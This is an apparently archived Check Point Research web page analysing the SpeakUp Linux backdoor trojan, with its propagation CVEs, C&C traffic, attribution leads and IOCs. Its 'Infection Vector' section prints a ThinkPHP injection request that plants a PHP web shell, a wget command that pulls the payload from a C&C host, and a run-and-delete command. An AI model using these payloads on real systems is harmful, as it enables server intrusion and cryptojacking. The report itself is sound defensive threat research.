<!doctype html>
<html lang="en-US" class="no-js">
<head>
<meta charset="UTF-8">
<title>SpeakUp: A New Undetected Backdoor Linux Trojan - Check Point Research</title>
<meta class='swiftype' name='popularity' data-type='integer' content='4'/>
<link href="//research.checkpoint.com/wp-content/themes/research/img/icons/favicon.ico" rel="shortcut icon">
<link href="//research.checkpoint.com/wp-content/themes/research/img/icons/touch.png" rel="apple-touch-icon-precomposed">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Latest Research by our Team">
<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-5JCRGP');</script>
<!-- End Google Tag Manager -->
<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />

	<!-- This site is optimized with the Yoast SEO plugin v16.2 - https://yoast.com/wordpress/plugins/seo/ -->
	<link rel="canonical" href="https://research.checkpoint.com/2019/speakup-a-new-undetected-backdoor-linux-trojan/" />
	<meta property="og:locale" content="en_US" />
	<meta property="og:type" content="article" />
	<meta property="og:title" content="SpeakUp: A New Undetected Backdoor Linux Trojan - Check Point Research" />
	<meta property="og:description" content="&nbsp; Check Point Research has discovered a new campaign exploiting Linux servers to implant a new Backdoor Trojan. Dubbed ‘SpeakUp’, the new Trojan exploits known vulnerabilities in six different Linux distributions. The attack targets worldwide servers including AWS hosted machines. Check Point researchers have spotted a new campaign exploiting Linux servers to implant a new... Click to Read More" />
	<meta property="og:url" content="https://research.checkpoint.com/2019/speakup-a-new-undetected-backdoor-linux-trojan/" />
	<meta property="og:site_name" content="Check Point Research" />
	<meta property="article:published_time" content="2019-02-04T14:01:53+00:00" />
	<meta property="article:modified_time" content="2019-02-05T14:46:17+00:00" />
	<meta property="og:image" content="https://research.checkpoint.com/wp-content/uploads/2019/01/Linux_Servers_Attacked_1021x580.jpg" />
	<meta property="og:image:width" content="1021" />
	<meta property="og:image:height" content="580" />
	<meta name="twitter:card" content="summary_large_image" />
	<meta name="twitter:label1" content="Written by">
	<meta name="twitter:data1" content="Dexter Eugenio">
	<meta name="twitter:label2" content="Est. reading time">
	<meta name="twitter:data2" content="10 minutes">
	<!-- / Yoast SEO plugin. -->


<link rel='dns-prefetch' href='//code.jquery.com' />
<link rel='dns-prefetch' href='//use.fontawesome.com' />
<link rel='stylesheet' id='wp-block-library-css'  href='//research.checkpoint.com/wp-includes/css/dist/block-library/style.min.css?ver=5.7.1' media='all' />
<link rel='stylesheet' id='research-css'  href='//research.checkpoint.com/wp-content/themes/research/style.css?ver=1.25' media='all' />
<link rel='stylesheet' id='bootstrap_css-css'  href='//research.checkpoint.com/wp-content/themes/research/css/bootstrap.min.css?ver=4.1' media='all' />
<link rel='stylesheet' id='flickity-css'  href='//research.checkpoint.com/wp-content/themes/research/css/flickity.min.css?ver=1.1' media='all' />
<link rel='stylesheet' id='fa-css'  href='https://use.fontawesome.com/releases/v5.6.3/css/all.css?ver=5.6.3' media='all' />
<link rel='stylesheet' id='enlighterjs-css'  href='https://research.checkpoint.com/wp-content/plugins/enlighter/cache/enlighterjs.min.css?ver=TJ0/7+iAWMKbDKS' media='all' />
<script type='text/javascript' src='https://code.jquery.com/jquery-3.4.0.min.js?ver=5.7.1' id='jquery-js'></script>
<script type='text/javascript' src='//research.checkpoint.com/wp-content/themes/research/js/lib/bootstrap.bundle.min.js?ver=4.1' id='bootstrap_js-js'></script>
<script type='text/javascript' src='//research.checkpoint.com/wp-content/themes/research/js/lib/flickity.pkgd.min.js?ver=1.0.1' id='flickity-js'></script>
<script type='text/javascript' src='//research.checkpoint.com/wp-content/themes/research/js/single-post.js?ver=1.0.4' id='post-js'></script>
<!-- Stream WordPress user activity plugin v3.6.2 -->
      <meta name="onesignal" content="wordpress-plugin"/>
            <script>

      window.OneSignal = window.OneSignal || [];

      OneSignal.push( function() {
        OneSignal.SERVICE_WORKER_UPDATER_PATH = "OneSignalSDKUpdaterWorker.js.php";
                      OneSignal.SERVICE_WORKER_PATH = "OneSignalSDKWorker.js.php";
                      OneSignal.SERVICE_WORKER_PARAM = { scope: "/" };
        OneSignal.setDefaultNotificationUrl("//research.checkpoint.com");
        var oneSignal_options = {};
        window._oneSignalInitOptions = oneSignal_options;

        oneSignal_options['wordpress'] = true;
oneSignal_options['appId'] = '3ba17c77-81bb-4a83-8917-7b62de3d6e22';
oneSignal_options['allowLocalhostAsSecureOrigin'] = true;
oneSignal_options['welcomeNotification'] = { };
oneSignal_options['welcomeNotification']['disable'] = true;
oneSignal_options['path'] = "https://research.checkpoint.com/wp-content/plugins/onesignal-free-web-push-notifications/sdk_files/";
oneSignal_options['safari_web_id'] = "web.onesignal.auto.45da02f8-0e2a-491b-9d85-c6fbaf55a283";
oneSignal_options['promptOptions'] = { };
                OneSignal.init(window._oneSignalInitOptions);
                OneSignal.showSlidedownPrompt();      });

      function documentInitOneSignal() {
        var oneSignal_elements = document.getElementsByClassName("OneSignal-prompt");

        var oneSignalLinkClickHandler = function(event) { OneSignal.push(['registerForPushNotifications']); event.preventDefault(); };        for(var i = 0; i < oneSignal_elements.length; i++)
          oneSignal_elements[i].addEventListener('click', oneSignalLinkClickHandler, false);
      }

      if (document.readyState === 'complete') {
           documentInitOneSignal();
      }
      else {
           window.addEventListener("load", function(event){
               documentInitOneSignal();
          });
      }
    </script>
<link rel="amphtml" href="https://research.checkpoint.com/2019/speakup-a-new-undetected-backdoor-linux-trojan/amp/"><script src="//research.checkpoint.com/wp-content/themes/research/header/inc-header.js?v=1.1"></script>
<link rel="stylesheet" href="//research.checkpoint.com/wp-content/themes/research/header/style.css">
<link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
</head>
<body class="single">
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5JCRGP" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->
<header id="inc-header">
    <div id="inc-top-nav">
        <div class="inc-wrapper">
            <ul>
                <li><a href="https://www.checkpoint.com">CheckPoint.com</a></li>
                <li><a href="https://www.facebook.com/checkpointresearch/"><img src="//sc1.checkpoint.com/sc1/inc/html/images/social/facebook.gif" alt="Facebook" /></a></li>
                <li><a href="https://plus.google.com/+checkpoint/posts"><img src="//sc1.checkpoint.com/sc1/inc/html/images/social/google-plus.gif" alt="Google Plus" /></a></li>
                <li><a href="https://www.linkedin.com/company/check-point-software-technologies"><img src="//sc1.checkpoint.com/sc1/inc/html/images/social/linkedin.gif" alt="LinkedIn" /></a></li>
                <li><a href="/cdn-cgi/l/email-protection#28175c47150e5b5d4a424d4b5c157a4d5b4d495a4b40066b404d4b43784741465c064b47450e4a474c51156b404d4b43475d5c0d1a185c404d0d1a1844495c4d5b5c0d1a185a4d5b4d495a4b400d1a1847460d1a187a4d5b4d495a4b40066b404d4b43784741465c064b474509"><img src="//sc1.checkpoint.com/sc1/inc/html/images/social/email.gif" alt="E-Mail Checked Point Research" /></a></li>
                <li><a href="https://research.checkpoint.com/feed"><img src="//sc1.checkpoint.com/sc1/inc/html/images/social/rss.gif" alt="RSS" /></a></li>
                <li><a href="https://twitter.com/_cpresearch_"><img src="//sc1.checkpoint.com/sc1/inc/html/images/social/twitter.gif" alt="Twitter" /></a></li>
            </ul>
        </div>
    </div>
    <div class="inc-wrapper">
        <div id="inc-logo">
            <a href="https://research.checkpoint.com/" title="Check Point Research"><img src="//sc1.checkpoint.com/sc1/inc/html/images/check-point-research-logo.gif" alt="Check Point Research" /></a>
        </div>
        <nav id="inc-nav">
            <ul class="menu">
                <li class="menu-item"><a href="https://research.checkpoint.com/category/threat-research/">Publications</a>
                    <ul class="inc-sub-menu">
                        <li><a href="https://research.checkpoint.com/category/threat-research/">Threat Research</a></li>
                        <li><a href="https://research.checkpoint.com/category/cpradio/">CPRadio</a></li>
                        <li><a href="https://research.checkpoint.com/category/threat-intelligence-reports/">Attack Reports</a></li>
                    </ul>
                </li>
                <li class="menu-item"><a href="#">Tools</a>
                    <ul class="inc-sub-menu">
                        <li><a href="https://threatemulation.checkpoint.com/" target="_blank">SandBlast File Analysis</a></li>
                        <li><a href="https://research.checkpoint.com/category/how-to-guides/">How-To Guides</a></li>
                        <li><a href="https://www.checkpoint.com/urlcat/" target="_blank">URL Categorization</a></li>
                        <li><a href="http://www.cpcheckme.com/checkme/" target="_blank">Instant Security Assessment</a></li>
                        <li><a href="https://threatmap.checkpoint.com/ThreatPortal/livemap.html" target="_blank">Live Threat Map</a></li>
                    </ul>
                </li>
                <li class="menu-item"><a href="https://research.checkpoint.com/about-us/">About Us</a></li>
                <li class="menu-item"><a href="https://research.checkpoint.com/contact/">Contact Us</a></li>
                <li class="menu-item"><a href="https://research.checkpoint.com/subscription/">Subscribe</a></li>
                <li class="menu-item"><a href="https://www.checkpoint.com/support-services/threatcloud-incident-response/"><img src="//research.checkpoint.com/wp-content/themes/research/img/lib/under-attack.gif" alt="Are You Under Attack?" /></a></li>
            </ul>
            <a href="#" class="mobile-menu" data-action="toggleMenu"><i class="fa fa-bars" data-action="toggleMenu"></i> MENU</a>
        </nav>
        <div id="inc-search">
            <input type="text" placeholder="Search for Research Publications, Malware Families, etc.." />
        </div>
    </div>
</header>
<div class="container" id="featured-image">
	<div class="row">
		<div class="col-md-12">
			<img width="1021" height="580" src="//research.checkpoint.com/wp-content/uploads/2019/01/Linux_Servers_Attacked_1021x580.jpg" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" loading="lazy" />		</div>
	</div>
</div>
<div class="container main clear" id="content-container">
<div class="row">
	<div class="col-md-12" id="content">
					<article id="post-20574" class="post-20574 post type-post status-publish format-standard has-post-thumbnail hentry category-threat-research category-searchable category-threat-research-2">
				<h1>SpeakUp: A New Undetected Backdoor Linux Trojan</h1>
				<!-- Date section -->
				<span id="post-date">
					February 4, 2019				</span>
				<!-- End Date section -->
				<p>&nbsp;</p>
<ul>
<li>Check Point Research has discovered a new campaign exploiting Linux servers to implant a new Backdoor Trojan.</li>
<li>Dubbed ‘SpeakUp’, the new Trojan exploits known vulnerabilities in six different Linux distributions.</li>
<li>The attack targets worldwide servers including AWS hosted machines.</li>
</ul>
<p>Check Point researchers have spotted a new campaign exploiting Linux servers to implant a new Backdoor which evades all security vendors. The new Trojan, named “SpeakUp” after one of its command and control names, exploits known vulnerabilities in six different Linux distributions. The attack is gaining momentum and targeting servers in East Asia and Latin America, including AWS hosted machines.</p>
<p>SpeakUp acts to propagate internally within the infected subnet, and beyond to new IP ranges, exploiting remote code execution vulnerabilities. In addition, SpeakUp presented ability to infect Mac devices with the undetected backdoor.</p>
<p>While the exact identity of the threat actor behind this new attack is still unconfirmed, Check Point Researchers were able to correlate SpeakUp’s author with malware developer under the name of <em>Zettabit</em>. Although SpeakUp is implemented differently, it has a lot in common with <em>Zettabit</em>’s craftmanship.</p>
<p style="text-align: center;"><a href="/wp-content/uploads/2019/01/fig1-1.png"><img loading="lazy" width="757" height="440" class="aligncenter size-full wp-image-20576" src="/wp-content/uploads/2019/01/fig1-1.png" alt="" /></a><strong>Figure 1:</strong> SpeakUp’s Victim Distribution</p>
<p><a href="/wp-content/uploads/2019/01/fig2-1.png"><img loading="lazy" width="617" height="278" class="aligncenter size-full wp-image-20577" src="/wp-content/uploads/2019/01/fig2-1.png" alt="" /></a></p>
<p style="text-align: center;"><strong>Figure 2:</strong> SpeakUp’s propagation rate per day</p>
<p>&nbsp;</p>
<p><strong>Infection Vector</strong></p>
<p>The initial infection vector is targeting the recently reported vulnerability in ThinkPHP and uses command injection techniques for uploading a PHP shell that serves and executes a Perl backdoor.</p>
<p>The exploitation is issued in three steps:</p>
<ol>
<li>Exploiting CVE-2018-20062 for uploading a PHP shell</li>
</ol>
<p>Using a GET request, a remote command execution vulnerability in ThinkPHP (CVE-2018-20062) is sent to the targeted server, as shown below:</p>
<p>s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=<em>echo ^&lt;? php $action = $_GET[&#8216;module&#8217;];system($action);? ^&gt;&gt;index.php</em></p>
<p>&nbsp;</p>
<p>This shell executes commands sent via the “module” parameter in a query.</p>
<ol start="2">
<li>Serving the backdoor</li>
</ol>
<p>Another HTTP request is sent to the targeted server, with the following resource:</p>
<p>/?module=<em>wget hxxp://67[.]209.177.163/ibus -O /tmp/e3ac24a0bcddfacd010a6c10f4a814bc</em></p>
<p>The above standard injection pulls the <em>ibus</em> payload and stores it on /tmp/e3ac24a0bcddfacd010a6c10f4a814bc</p>
<ol start="3">
<li>Launching the backdoor</li>
</ol>
<p>The execution is issued using an additional HTTP request:</p>
<p>/?module=<em>perl /tmp/ e3ac24a0bcddfacd010a6c10f4a814bc</em><em>;sleep 2;rm -rf /tmp/ e3ac24a0bcddfacd010a6c10f4a814bc</em></p>
<p>That executes the perl script, puts it to sleep for two seconds and deletes the file to remove any evidence.</p>
<p>&nbsp;</p>
<p><strong>Backdoor</strong></p>
<p>The sample we analyzed was observed targeting a machine in China on January 14, 2019 and was first submitted to VirusTotal on January 9 2019. At the time of writing this article, it has no detections in VT.</p>
<p><a href="/wp-content/uploads/2019/01/fig3-1.png"><img loading="lazy" class="aligncenter wp-image-20578" src="/wp-content/uploads/2019/01/fig3-1-1024x817.png" alt="" width="759" height="606" /></a></p>
<p style="text-align: center;"><strong>Figure 3:</strong> no detections for SpeakUp in Virus Total</p>
<p>&nbsp;</p>
<p>In an attempt to endure the investigation process by security researchers, the second stage payload was encoded with salted base64. To our dismay, the C&amp;C communication was also encoded with the same combination.</p>
<p>The revealed data contains multiple C&amp;C domains, IP addresses and other unique parameters, along with second-stage payloads and additional modules.<br />
In the below analysis we will go through the malicious code, reveal the different functions and modules the Trojan runs on the victim’s machine.</p>
<p>&nbsp;</p>
<p><strong>Victim Registration</strong></p>
<p>SpeakUp uses <em>POST</em> and <em>GET</em> requests over HTTP to communicate with its main C&amp;C which is the compromised website of speakupomaha[.]com.<br />
The first <em>POST</em> packet sends a victim ID and more introductory information such as the current version of the installed script. (Currently 1.0.4)<br />
The immediate first C&amp;C response is “needrgr” which means the infected victim is new to the server and needs a registration.<br />
Afterwards, the Trojan posts “full information” about the machine by executing the following LINUX commands:</p>
<ul>
<li><em>Uname (-r, -v, -m, -n,-a, -s)</em></li>
<li><em>Whoami</em></li>
<li><em>Ifconfig –a</em></li>
<li><em>Arp –a</em></li>
<li><em>cat /proc/cpuinfo | grep -c &#8220;cpu family&#8221; 2&gt;&amp;1</em></li>
<li><em>who –b</em></li>
</ul>
<p><a href="/wp-content/uploads/2019/01/fig-4-1.png"><img loading="lazy" class="aligncenter wp-image-20575" src="/wp-content/uploads/2019/01/fig-4-1-1024x464.png" alt="" width="746" height="338" /></a></p>
<p style="text-align: center;"><strong>Figure 4:</strong> The registration process and introductory commands</p>
<p>&nbsp;</p>
<p><strong>SpeakUp’s Main Functions</strong></p>
<p>After the registration process is completed, SpeakUp continuously communicates with its C&amp;C for new tasks on a fixed “knock” interval.</p>
<p>The following command types are available by the C&amp;C:</p>
<p>“newtask”- Execute arbitrary code on the local machine, download and execute a file from any remote server, kill or uninstall the program and sends updated fingerprint data.</p>
<p>“notask”- Sleep for 3 seconds and ask for additional command.</p>
<p>newerconfig”- Update the downloaded miner configuration file.</p>
<p>SpeakUp’s persistence is ensured by using <em>cron</em> and an internal <em>mutex</em> to ensure only one instance remains alive at all times.</p>
<p>&nbsp;</p>
<p><strong>Post-Infection Traffic</strong></p>
<p>Once the victim is registered successfully, the C&amp;C begins sending new tasks. Most of them manipulate the machine to download and execute different files.</p>
<p>An interesting point to mention is the User-Agents in use. SpeakUp defines three User-Agents that the infected machine must use in every communication with its C&amp;C. Two of them are MacOS X User-Agents and the third is a hashed string:</p>
<ul>
<li><em>Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/BADDAD</em></li>
<li><em>Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B405</em></li>
</ul>
<ul>
<li><em>E9BC3BD76216AFA560BFB5ACAF5731A3</em></li>
</ul>
<p><a href="/wp-content/uploads/2019/01/fig5.jpg"><img loading="lazy" width="531" height="292" class="aligncenter size-full wp-image-20580" src="/wp-content/uploads/2019/01/fig5.jpg" alt="" /></a></p>
<p style="text-align: center;"><strong>Figure 5:</strong> SpeakUp `s requests are encrypted with the salted base64 and include the unique User-Agent</p>
<p>&nbsp;</p>
<p>At the moment SpeakUp serves XMRig miners to its listening infected servers.  According to <a href="https://www.xmrhunter.com/">XMRHunter</a> the wallets hold a total of ~107 Monero coins.</p>
<p><a href="/wp-content/uploads/2019/01/fig6.jpg"><img loading="lazy" width="495" height="409" class="aligncenter size-full wp-image-20581" src="/wp-content/uploads/2019/01/fig6.jpg" alt="" /></a></p>
<p style="text-align: center;"><strong>Figure 6:</strong> SpeakUp receives additional commands to execute, this time in plain text.</p>
<p>&nbsp;</p>
<p><strong>Propagation</strong></p>
<p>SpeakUp also equips its backdoors with i <em>(sic)</em>, a python script which allows the backdoor to scan and infect more Linux servers within its internal and external subnets. Its main functions are:</p>
<ol>
<li>Brute-force using a pre-defined list of usernames and passwords in an attempt to login to Admin panels.</li>
<li>Scan the network environment of the infected machine; checks for availability of specific ports on servers that share the same internal and external subnet mask (i.e 255.255.0.0\16).</li>
<li>Try to exploit the following Remote Code Execution vulnerabilities in the targeted servers:</li>
</ol>
<p>a) CVE-2012-0874: JBoss Enterprise Application Platform Multiple Security Bypass Vulnerabilities<br />
b) CVE-2010-1871: JBoss Seam Framework remote code execution<br />
c) JBoss AS 3/4/5/6: Remote Command Execution (<a href="https://www.exploit-db.com/exploits/36575" target="_blank" rel="noopener">exploit</a>)<br />
d) CVE-2017-10271: Oracle WebLogic wls-wsat Component Deserialization RCE<br />
e) CVE-2018-2894: Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware.<br />
f) Hadoop YARN ResourceManager &#8211; Command Execution (<a href="https://www.exploit-db.com/exploits/45025" target="_blank" rel="noopener">exploit</a>)<br />
g) CVE-2016-3088: Apache ActiveMQ Fileserver File Upload Remote Code Execution Vulnerability.</p>
<p>A successful exploitation of one of the vulnerabilities will result in deploying the original <em>ibus</em> script on the exploited server.</p>
<p>&nbsp;</p>
<p><strong>Attacker Identity and Leads</strong></p>
<p>Ibus client for Unix OS</p>
<p>Inside the <em>ibus</em> script, we can see a short description about an IBus client for GNU Emacs. The <a href="https://github.com/ibus/ibus" target="_blank" rel="noopener">IBus client</a> is an open-source multilingual input framework for Linux and Unix OS. While it supports all languages that do not use Latin letters, it seems that the main audience is Asian users. The description and the file name are the only elements that link SpeakUp to the Ibus framework; the content has no similarities whatsoever.</p>
<p>This may imply a connection between SpeakUp to East Asia.</p>
<p><strong><br />
Unique User-Agents</strong></p>
<p>The unique User-Agents used in the HTTP communication between SpeakUp to the C&amp;C are a possible path to the identity of the threat actor behind this campaign.<br />
The unique strings mainly consist of “Mobile/BADDAD“, “Mobile/7B405” and “<em>E9BC3BD76216AFA560BFB5ACAF5731A3</em><em>”</em>.</p>
<p>Interestingly enough, the string turned out to be the md5 hash of the word <em>liteHTTP</em>.</p>
<p>Googling liteHTTP leads to the <em>liteHTTP</em> github <a href="https://github.com/zettabithf/LiteHTTP" target="_blank" rel="noopener">project</a>.</p>
<p>While <em>liteHTTP</em> is a C# based bot which targets Windows clients, its modules are somewhat similar to our SpeakUp Trojan.</p>
<ul>
<li>Download &amp; execute</li>
<li>Startup (with persistence)</li>
<li>Collection of system information (OS, version, installed location, etc.)</li>
<li>Self-update</li>
<li>Uninstall</li>
</ul>
<p>This project was created by a user called <em>zettabithf</em> which is linked to a user with the same name in <a href="https://www.hackforums.net/member.php?action=profile&amp;uid=1972967" target="_blank" rel="noopener">Hack Forums</a>.</p>
<p><a href="/wp-content/uploads/2019/02/profilepic.png"><img loading="lazy" class="aligncenter wp-image-20603" src="/wp-content/uploads/2019/02/profilepic.png" alt="" width="285" height="466" /></a></p>
<p style="text-align: center;"><strong>Figure 7</strong>: Zettabit`s user description on Hack Forums</p>
<p>The Hack Forums profile may imply the author of SpeakUp backdoor is Russian speaking, as many of the comments are written in this language. He also seems to be a botnet developer, providing recommendations and publishing his LiteHTTP bot, which seems to have a well-designed GUI interface.</p>
<p>Another interesting thing to note is the use of the acronym “Knock” on several occasions in his posts. “Knock” also appears in several strings inside the code of SpeakUp.</p>
<p><a href="/wp-content/uploads/2019/01/fig-8-1.png"><img loading="lazy" width="743" height="397" class="aligncenter size-full wp-image-20579" src="/wp-content/uploads/2019/01/fig-8-1.png" alt="" /></a> <a href="/wp-content/uploads/2019/01/fig9-1.png"><img loading="lazy" class="aligncenter wp-image-20583" src="/wp-content/uploads/2019/01/fig9-1.png" alt="" width="710" height="470" /></a></p>
<p style="text-align: center;"><strong>Figures 8 and 9:</strong> LiteHTTP screenshots taken from the user`s profile in which the acronym “Knock” appears</p>
<p>&nbsp;</p>
<p><strong>Conclusion</strong></p>
<p>SpeakUp`s obfuscated payloads and propagation technique is beyond any doubt the work of a bigger threat in the making. It is hard to imagine anyone would build such a compound array of payloads just to deploy few miners. The threat actor behind this campaign can at any given time deploy additional payloads, potentially more intrusive and offensive. It has the ability to scan the surrounding network of an infected server and distribute the malware. This campaign, while still relatively new, can evolve into something bigger and potentially more harmful.</p>
<p>Indeed, the threat actor behind this campaign, ‘Zettabithf’ himself, provides some ‘words of wisdom’ in this respect:</p>
<p><a href="/wp-content/uploads/2019/01/quote.png"><img loading="lazy" width="333" height="23" class="aligncenter size-full wp-image-20584" src="/wp-content/uploads/2019/01/quote.png" alt="" /></a></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p><a href="https://www.checkpoint.com/solutions/cloud-security/" target="_blank" rel="noopener">CloudGuard IaaS</a> is an advanced threat prevention technology that protects against on your cloud infrastructure, including new Trojans like &#8216;SpeakUp&#8217;.</p>
<p>The Check Point IPS blade provides protections against these threats:</p>
<ul>
<li>Command Injection Over HTTP</li>
<li>NoneCMS ThinkPHP Remote Code Execution (CVE-2018-20062)</li>
<li>Oracle WebLogic WLS Security Component Remote Code Execution (CVE-2017-10271)</li>
<li>Oracle WebLogic WLS Server Component Arbitrary File Upload(CVE-2018-2894)</li>
<li>Hadoop YARN ResourceManager Remote Command Execution</li>
<li>Apache ActiveMQ Fileserver Multi Methods Directory Traversal(CVE-2016-3088)</li>
<li>JBoss Seam 2 Framework Remote Code Execution (CVE-2010-1871)</li>
<li>JBoss Enterprise Application Platform Invoker Servlets Remote Code Execution (CVE-2012-0874)</li>
<li>Red Hat JBoss AS Remote Code Execution</li>
<li>Suspicious Linux Shell Downloader</li>
</ul>
<p>The Check Point Anti-Bot blade provides protections against this threat:</p>
<ul>
<li>Linux.SpeakUp</li>
</ul>
<p>&nbsp;</p>
<p><strong>IOCs</strong></p>
<p><strong>Md5:</strong></p>
<p><em>SpeakUp Scripts: </em></p>
<table width="243">
<tbody>
<tr>
<td width="243">0a4e5831a2d3115acb3e989f0f660a6f</td>
</tr>
<tr>
<td width="243">0b5e1eb67be7c3020610b321f68375c1</td>
</tr>
<tr>
<td width="243">968d1906be7eb8321a3afac5fde77467</td>
</tr>
<tr>
<td width="243">074d7a4417d55334952d264c0345d885</td>
</tr>
<tr>
<td width="243">f357f32d7c2ddfef4b5850e7506c532b</td>
</tr>
<tr>
<td width="243">b6311bffcea117dceac5ccac0a243ae5</td>
</tr>
<tr>
<td width="243">2adf4e4512aaafab75e8411aa7121ffa</td>
</tr>
<tr>
<td width="243">a73c7b777d31b0a8ef270809e2ed6510</td>
</tr>
<tr>
<td width="243">114cda60d215e44baeef22b7db0c64d5</td>
</tr>
<tr>
<td width="243">8f725fc5406ebf679c5c7ade3e8d5f70</td>
</tr>
<tr>
<td width="243">4a80a075c7c6b5e738a7f4b60b7b101f</td>
</tr>
<tr>
<td width="243">e18749e404baec2aa29f4af001164d1b</td>
</tr>
<tr>
<td width="243">1a377b5d5d2162327f0706cc84427780</td>
</tr>
<tr>
<td width="243">1da94e156609d7e880c413a124bad004</td>
</tr>
<tr>
<td width="243">713260a53eff05ad44aad8d6899f1c6e</td>
</tr>
<tr>
<td width="243">36cda3c77ba380d6388a01aafcbaa6c7</td>
</tr>
<tr>
<td width="243">0f83482368343f5c811bac84a395d2c0</td>
</tr>
<tr>
<td width="243">8dd6cb5f33d25512805c70bd3db5f433</td>
</tr>
<tr>
<td width="243">e4ca1e857034cbe0428d431c15ec8608</td>
</tr>
<tr>
<td width="243">36502273cee61825dc97d62a3dffe729</td>
</tr>
<tr>
<td width="243">f16c5a6342ccc253b1de177d3fa310b1</td>
</tr>
<tr>
<td width="243">08d7674532cc226931570e6a99d5ba30</td>
</tr>
<tr>
<td width="243">279c4aa955085480f3ad0c19aa36a93b</td>
</tr>
</tbody>
</table>
<p><strong> </strong></p>
<p><strong><em>XMRig Miners:</em></strong></p>
<p>f79be3df4cbfe81028040796733ab07f<br />
a21a3d782d30b51515834a7bf68adc8e<br />
c572a10ca12f3bd9783c6d576aa080fb<br />
b60ec230644b740ca4dd6fd45059a4be<br />
5e6b6fcd7913ae4917b0cdb0f09bf539<br />
ae875c496535be196449547a15205883<br />
068d424a1db93ec0c1f90f5e501449a3<br />
996e0c8190880c8bf1b8ffb0826cf30f</p>
<p><strong> </strong></p>
<p><strong>C&amp;Cs:</strong></p>
<table width="311">
<tbody>
<tr>
<td width="311">67[.]209.177.163</td>
</tr>
<tr>
<td width="311">173[.]82.104.196</td>
</tr>
<tr>
<td width="311">5[.]196.70.86</td>
</tr>
<tr>
<td width="311">120[.]79.247.183</td>
</tr>
<tr>
<td width="311">5[.]2.73.127/lnsqqFE2jK/pprtnp153WWW.php</td>
</tr>
<tr>
<td width="311">Speakupomaha[.]com/misc/ui/images/Indxe.php</td>
</tr>
<tr>
<td width="311">Linuxservers[.]000webhostapp[.]com/hp.html</td>
</tr>
<tr>
<td width="311">linuxsrv134[.]xp3[.]biz</td>
</tr>
</tbody>
</table>
<p><strong> </strong></p>
<p><strong>Monero Wallets:</strong></p>
<p>47UW2Qv7AB4CsD8L5WWSvx58ztrzHhcMeYN7AJry9aMZhGDLXGwBHLv8LpaDUxpmdWfqbbfrqpdieQAeVSMCU1qY4BFABPY<br />
4Aa3TcU7ixMVcYwbsw8ENVbFwt4ZuqrNBVij5TRvPCTpGRK5BKBHQPu7ahT7z2A6547a5Lcn7yPZV1xU22ZbviqxUX7JVuP<br />
4An3Radh69LgcTHJf1U3awa9ffej4b6DcUmEv8wirsDm8zRMSjifrwybH2AzHdEsW8eew3rFtk4QbGJMxqitfxmZJhABxpT</p>
<p><strong> </strong></p>
<p>&nbsp;</p>
							</article>
						<div id="related">
			<h2>Related Articles</h2>
			<!-- Flickity HTML init -->
			<div class="carousel" data-flickity='{ "groupCells": true, "pageDots": false, "wrapAround": true }'>
							<div class="carousel-cell">
					<a href="//research.checkpoint.com/2021/mobile-app-developers-misconfiguration-of-third-party-services-leave-personal-data-of-over-100-million-exposed/">
						<img width="1200" height="628" src="//research.checkpoint.com/wp-content/uploads/2021/05/MisuseCloudServices_social_FB.jpg" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" loading="lazy" />						<h3>Mobile app developers’ misconfiguration of third party services leave personal data of over 100 million exposed</h3>
					</a>
				</div>
							<div class="carousel-cell">
					<a href="//research.checkpoint.com/2021/new-wormable-android-malware-spreads-by-creating-auto-replies-to-messages-in-whatsapp/">
						<img width="1021" height="580" src="//research.checkpoint.com/wp-content/uploads/2021/04/WormableWhatsApp_blog_header.jpg" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" loading="lazy" />						<h3>New Wormable Android Malware Spreads by Creating Auto-Replies to Messages in WhatsApp</h3>
					</a>
				</div>
							<div class="carousel-cell">
					<a href="//research.checkpoint.com/2020/vulnerability-in-google-play-core-library-remains-unpatched-in-google-play-applications/">
						<img width="1021" height="580" src="//research.checkpoint.com/wp-content/uploads/2020/12/GooglePlayBanner-Social-1021x580B.jpg" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" loading="lazy" />						<h3>Vulnerability in Google Play Core Library Remains Unpatched in Google Play Applications</h3>
					</a>
				</div>
							<div class="carousel-cell">
					<a href="//research.checkpoint.com/2020/graphology-of-an-exploit-volodya/">
						<img width="1078" height="520" src="//research.checkpoint.com/wp-content/uploads/2020/09/graphology_of_an_exploit.jpg" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" loading="lazy" />						<h3>Graphology of an Exploit &#8211; Hunting for exploits by looking for the author&#8217;s fingerprints</h3>
					</a>
				</div>
							<div class="carousel-cell">
					<a href="//research.checkpoint.com/2020/amazons-alexa-hacked/">
						<img width="1021" height="580" src="//research.checkpoint.com/wp-content/uploads/2020/08/AlexaHacked_blog_header-1.jpg" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" loading="lazy" />						<h3>Keeping the gate locked on your IoT devices: Vulnerabilities found on Amazon&#8217;s Alexa</h3>
					</a>
				</div>
							<div class="carousel-cell">
					<a href="//research.checkpoint.com/2020/new-joker-variant-hits-google-play-with-an-old-trick/">
